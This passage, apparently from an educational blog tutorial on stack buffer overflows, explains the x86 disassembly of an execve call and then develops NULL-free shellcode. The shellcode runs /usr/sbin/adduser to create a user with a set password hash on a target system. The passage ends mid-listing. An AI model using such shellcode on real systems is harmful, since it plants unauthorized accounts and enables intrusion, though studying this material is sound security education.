<span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>				
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>			
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">4</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">5</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">6</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">8</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>		
<span class="err">9</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">10</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x0</span>				
<span class="err">11</span>	<span class="nf">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">eax</span>				
<span class="err">13</span>	<span class="nf">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>			
<span class="err">14</span>	<span class="nf">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">&gt;</span>		
<span class="err">15</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">16</span>	<span class="nf">leave</span>
<span class="err">17</span>	<span class="nf">ret</span></code></pre></figure> <p></p> <p>Let‚Äôs start the analysis with two already well-known instructions:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>				
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p> When you enter the main function, the old frame pointer is first saved and then overwritten with the stack pointer.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x28</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>			
<span class="err">4</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbe0</span><span class="p">,</span><span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">5</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf2</span><span class="p">,</span><span class="mh">0xffffffdc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">6</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dbf9</span><span class="p">,</span><span class="mh">0xffffffe0</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x808dc00</span><span class="p">,</span><span class="mh">0xffffffe4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">8</span>	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0xffffffe8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>		</code></pre></figure> <p></p> <p>In line three, 40 bytes are reserved for the local variables. As can be seen from the C code, however, only a field of five pointers is created, the GCC compiler reserves 20 bytes extra. This can be traced back to the bug of the GCC 3.X compiler, which in our case is no longer tragic. In lines four to eight, the addresses of the string literals are written to the previously reserved region. The string literals are constants that are stored in the data segment of the program.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x4</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p> In line nine another four bytes are reserved on the stack, but the sense of this instruction does not seem to be clear.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x0</span>				
<span class="err">11</span>	<span class="nf">lea</span>    <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">eax</span>				
<span class="err">13</span>	<span class="nf">pushl</span>  <span class="mh">0xffffffd8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>					</code></pre></figure> <p> The three parameters of the execv function are then placed on the stack. Make sure that this is done in the reverse order, i. e. that the last parameter is placed on the stack first. Therefore, the parameter NULL is placed on the stack first. Next, the address of the first pointer must be determined in line eleven (this corresponds to the second parameter of the function). In the last step, the address of the string literal name[0] = ‚Äú/usr/sbin/adduser‚Äù is placed on the stack.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">14</span>	<span class="nf">call</span>   <span class="mh">0x804cac0</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">&gt;</span></code></pre></figure> <p> The CALL instruction places the return address on the stack and then branches to the <code class="language-plaintext highlighter-rouge">execve()</code> sub-function. If the <code class="language-plaintext highlighter-rouge">execve()</code> function is executed successfully, it will not return (the current program code is replaced by a new one). Should it still return to <code class="language-plaintext highlighter-rouge">main()</code> in case of an error, the following lines will be executed:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">15</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">16</span>	<span class="nf">leave</span>
<span class="err">17</span>	<span class="nf">ret</span></code></pre></figure> <p> Some cleanup work is done on the stack and finally <code class="language-plaintext highlighter-rouge">main()</code> is left. The next step is to examine the system function <code class="language-plaintext highlighter-rouge">execve()</code> in more detail. This is much more difficult than analyzing <code class="language-plaintext highlighter-rouge">main()</code>. Before doing so, however, it is advisable to sketch the stack. The memory that is allocated too much should not be taken into account.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/example1-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/example1-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/example1-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/example1.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 8:</b> Analysis of the disassembled C-Program (1). </figcaption> </figure> <p>It is important that the name is not a pointer to one of the string literals, but a pointer to the pointer name[0]. But why do you need a pointer to a pointer? The answer is relatively simple: the program useradd, which is called later, contains a main function to which parameters can be passed. The function header will look something like this:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{....</span> <span class="p">}</span></code></pre></figure> <p> This function header is used if you want to pass a list of arguments to the program. The *argv[] is also a pointer to another pointer, namely the pointer to the pointer of the first argument. In our case, the pointer name assumes exactly the same function. In fact, it is exactly this pointer that will later be handed over to the main function of the ‚Äúuseradd‚Äù program. Therefore, it also makes sense to place the pointers of our string literals directly one after the other on the stack. This makes it possible to iterate through the list of pointers without any problems and to read in the individual arguments successively. The null pointer name[4] is used as an end identifier for the pointer list. The following is the assembly code of the execve() function: </p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembly</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">__execve</span><span class="p">:</span>
<span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>			
<span class="err">2</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">3</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>		
<span class="err">4</span>	<span class="nf">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">5</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">edi</span>			
<span class="err">6</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span>		
<span class="err">8</span>	<span class="nf">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span>
<span class="err">9</span>	<span class="nf">call</span>   <span class="mh">0x0</span>			
<span class="err">10</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>		
<span class="err">11</span>	<span class="nf">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">13</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">14</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">15</span>	<span class="nf">int</span>    <span class="kc">$</span><span class="mh">0x80</span>			
<span class="err">16</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">17</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">18</span>	<span class="nf">cmp</span>    <span class="kc">$</span><span class="mh">0xfffff000</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
<span class="err">19</span>	<span class="nf">jbe</span>    <span class="mh">0x804caff</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
<span class="err">20</span>	<span class="nf">neg</span>    <span class="o">%</span><span class="nb">ebx</span>
<span class="err">21</span>	<span class="nf">call</span>   <span class="mh">0x80484bc</span> <span class="o">&lt;</span><span class="nv">__errno_location</span><span class="o">&gt;</span>
<span class="err">22</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,(</span><span class="o">%</span><span class="nb">eax</span><span class="p">)</span>
<span class="err">23</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xffffffff</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
<span class="err">24</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">25</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebx</span>
<span class="err">26</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">edi</span>
<span class="err">27</span>	<span class="nf">pop</span>    <span class="o">%</span><span class="nb">ebp</span>
<span class="err">28</span>	<span class="nf">ret</span></code></pre></figure> <p></p> <p>The first lines are almost identical to the main function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>			
<span class="err">2</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">3</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>		
<span class="err">4</span>	<span class="nf">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span></code></pre></figure> <p> In line two, the EAX register is set to zero and a TEST instruction with this register is executed in line four. This command causes a bitwise AND operation without modifying the operands. Only the corresponding flags in the status register are set or deleted. In this case, as we will see below, only the fact that the zero flag is set is of interest.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">5</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">edi</span>			
<span class="err">6</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>			
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span></code></pre></figure> <p> The registers EDI and EBX are then saved to the stack. The instruction in line seven loads the pointer name[0] into the register EDI.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">8</span>	<span class="nf">je</span>     <span class="mh">0x804cad6</span> <span class="o">&lt;</span><span class="nv">__execve</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span></code></pre></figure> <p> If the zero-flag is set, the system branches to line eight. This is, as already mentioned, always the case. The program flow is therefore always continued in line ten.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>		
<span class="err">11</span>	<span class="nf">mov</span>    <span class="mh">0x10</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>		
<span class="err">12</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span></code></pre></figure> <p> The instructions in line ten or eleven cause the third parameter with the value NULL to be copied to EDX and the pointer name to ECX. Afterwards the EBX register is saved on the stack again (it doesn‚Äôt seem to make much sense).</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">13</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">edi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>		
<span class="err">14</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>		
<span class="err">15</span>	<span class="nf">int</span>    <span class="kc">$</span><span class="mh">0x80</span></code></pre></figure> <p> Before a software interrupt is triggered in line 15, the registers EBX and EAX are set to the value 0xb and to the pointer name[0]. As can be seen from the ‚ÄúSystem Call Table‚Äù of our Linux system, the value 0xb (11) corresponds exactly to the system call ‚Äúsys_execve‚Äù provided by the operating system. The remaining lines 16 - 28 are not considered further, since they are only executed in the event of an error in the system call. We will introduce a simple error handling later.</p> <p>Apparently, all arguments to the system call were stored in different registers. In fact, for system calls with fewer than 6 parameters, the arguments are all stored in the EBX, ECX, EDX, ESI and EDI registers in turn. The number of the desired call is always stored in the register EAX and the return value of the system call is also written back to EAX. In our case, the registers are described as follows: EAX: 11 (No. of system-call execve) EBX: name[0] ECX: name EDX: NULL</p> <p>If we compare this with the call execve (name[0], name, NULL), the assignment of the registers also makes sense, the order of the parameters was kept.</p> <h2 id="development-of-a-custom-assembly-program">Development of a Custom Assembly Program</h2> <p>Following our detailed analysis of the compiler-generated assembly code, we can now write a much more compact version. Before diving in, however, two points need consideration:</p> <ol> <li> <p><strong>String Literals Placement</strong><br/> Previously, we observed that string literals are stored in the data segment. But when injecting executable code into a target system, we only have access to the input buffer‚Äîthere is no separate data segment available for our injected payload. Therefore, the necessary strings must be placed immediately after our executable code. Thanks to the <code class="language-plaintext highlighter-rouge">JMP/CALL</code> construct mentioned earlier, the addresses of these strings can later be computed correctly in the injected code.</p> </li> <li> <p><strong>Error Handling</strong><br/> Proper error handling for system calls has not yet been implemented. Here, we will opt for the simplest possible approach: if a system call fails, the process should exit gracefully with an <code class="language-plaintext highlighter-rouge">exit()</code> system call. The system call number for <code class="language-plaintext highlighter-rouge">exit()</code> on Linux is <code class="language-plaintext highlighter-rouge">1</code>; it expects a status code as an argument. The assembly code below demonstrates how to implement this functionality.</p> </li> </ol> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm">	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebx</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span></code></pre></figure> <p> Below is a brief summary of the steps required to create a working code to corrupt the target system:</p> <ol> <li>Correct placement of strings after the actual code</li> <li>Determine the individual string addresses and place them in a suitable place</li> <li>Storing a NULL pointer (directly behind the string addresses)</li> <li>Null termination of the individual strings (not done automatically!!)</li> <li>Setting the four registers EAX up to EDX</li> <li>Triggering a software interrupt</li> <li>Error handling The code should have the following structure:</li> </ol> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/examplestructure-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/examplestructure-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/examplestructure-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/examplestructure.png" class="img-fluid rounded z-depth-1 imgcenter" width="600px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 9:</b> Exploit code structure. </figcaption> </figure> <p>Some initial runnable code might look like this:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">jmp</span> <span class="nv">data</span>
<span class="nl">start:</span>
	<span class="nf">popl</span> <span class="o">%</span><span class="nb">esi</span>             <span class="err">#</span> <span class="nv">Base</span> <span class="nv">Address</span> <span class="nv">der</span> <span class="nv">Strings</span> <span class="nv">vom</span> <span class="nv">Stack</span> <span class="nv">holen</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 		
	<span class="nf">leal</span> <span class="mi">18</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>			
	<span class="nf">leal</span> <span class="mi">25</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">leal</span> <span class="mi">28</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Termination</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">Strings</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="mh">0x7D</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>  <span class="err">#</span> <span class="nv">NULL</span><span class="o">-</span><span class="nv">Pointer</span> <span class="nv">at</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">pointer</span> <span class="nv">list</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Code</span> <span class="nv">of</span> <span class="nv">SysCall</span><span class="o">-</span><span class="nv">table</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>        <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="nf">leal</span> <span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="p">[</span><span class="nv">A</span><span class="p">]</span> <span class="nv">to</span> <span class="nb">ECX</span> <span class="p">(</span><span class="nv">name</span><span class="p">[])</span>
	<span class="nf">leal</span> <span class="mh">0x7D</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>  <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">null</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nb">EDX</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="nv">Trigger</span> <span class="nv">Interrupt</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Begin</span> <span class="nv">of</span> <span class="nv">Error</span> <span class="nv">Handling</span>
	<span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>
<span class="nl">data:</span>
	<span class="nf">call</span> <span class="nv">start</span>            <span class="err">#</span> <span class="nv">Put</span> <span class="nv">base</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">Strings</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">Stack</span>
<span class="nf">.string</span> <span class="err">\"</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">adduser#markus#</span><span class="o">-</span><span class="nv">p#$1$7</span><span class="err">√è</span><span class="nv">v</span><span class="err">√ô</span><span class="nv">LK</span><span class="err">√è¬µ</span><span class="kc">$</span><span class="nb">gS</span><span class="nv">UKG6RALzRA8ryROcTsG0#</span><span class="err">\"</span></code></pre></figure> <p></p> <p>When placing the strings, remember that an extra byte is needed to mark the end of each string. In this example, the <code class="language-plaintext highlighter-rouge">#</code> character is used as a placeholder for the string terminator.</p> <p>However, when testing this code, you might notice that the C function <code class="language-plaintext highlighter-rouge">strcpy()</code> does not copy the entire code into the overflow buffer. The reason is straightforward: There are <strong>NULL bytes</strong> present in the code. Since <code class="language-plaintext highlighter-rouge">strcpy()</code> stops copying as soon as it encounters a <code class="language-plaintext highlighter-rouge">\0</code>, any subsequent code is ignored. This effectively renders the code unusable.</p> <p>To solve this problem, <strong>all NULL bytes must be removed</strong>. But because the strings themselves require termination bytes, a different approach must be used. Here, an important principle from Boolean algebra becomes relevant:</p> \[x \nleftrightarrow x = 0\] <p>Therefore, a register can be set to zero with a simple XOR operation and then written to the corresponding memory locations. This changes the code as follows:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">jmp</span> <span class="nv">data</span>
<span class="nl">start:</span>
	<span class="nf">popl</span> <span class="o">%</span><span class="nb">esi</span>             <span class="err">#</span> <span class="nv">Base</span> <span class="nv">Address</span> <span class="nv">der</span> <span class="nv">Strings</span> <span class="nv">vom</span> <span class="nv">Stack</span> <span class="nv">holen</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> 		
	<span class="nf">leal</span> <span class="mi">18</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">67</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>			
	<span class="nf">leal</span> <span class="mi">25</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">71</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>		
	<span class="nf">leal</span> <span class="mi">28</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">for</span> <span class="nv">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">75</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">xorl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>        <span class="err">#</span> <span class="nv">Null</span> <span class="nv">the</span> <span class="nb">EAX</span> <span class="nv">register</span>		
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">17</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>     <span class="err">#</span> <span class="nv">Termination</span> <span class="nv">of</span> <span class="nv">the</span> <span class="nv">Strings</span> <span class="p">(</span><span class="nv">one</span> <span class="kt">byte</span> <span class="nv">each</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">24</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">27</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movb</span> <span class="o">%</span><span class="nb">al</span><span class="p">,</span><span class="mi">62</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mi">79</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">)</span>    <span class="err">#</span> <span class="nv">NULL</span><span class="o">-</span><span class="nv">Pointer</span> <span class="nv">at</span> <span class="nv">end</span> <span class="nv">of</span> <span class="nv">pointer</span> <span class="nv">list</span>
